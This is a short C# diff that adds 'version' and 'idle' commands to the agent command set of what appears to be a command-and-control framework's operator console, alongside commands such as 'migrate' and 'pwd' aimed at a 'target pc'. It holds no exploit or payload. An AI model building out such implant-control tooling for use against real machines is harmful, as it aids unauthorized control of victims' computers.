@@ -30,6 +30,9 @@ namespace Commander.Commands.Agent
 
         public static string MIGRATE = "migrate";
 
+        public static string VERSION = "version";
+        public static string IDLE = "idle";
+
         public override string Category => CommandCategory.Core;
 
         public override RootCommand Command => new RootCommand(this.Description);
@@ -66,6 +69,20 @@ namespace Commander.Commands.Agent
     {
         public override string Description => "Get current directory of the agent";
         public override string Name => EndPointCommand.PWD;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+    }
+
+    public class VersionCommand : EndPointCommand
+    {
+        public override string Description => "Get Version of the agent";
+        public override string Name => EndPointCommand.VERSION;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
+    }
+
+    public class IdleCommand : EndPointCommand
+    {
+        public override string Description => "Get The idle time of the target pc";
+        public override string Name => EndPointCommand.IDLE;
         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
     }
 
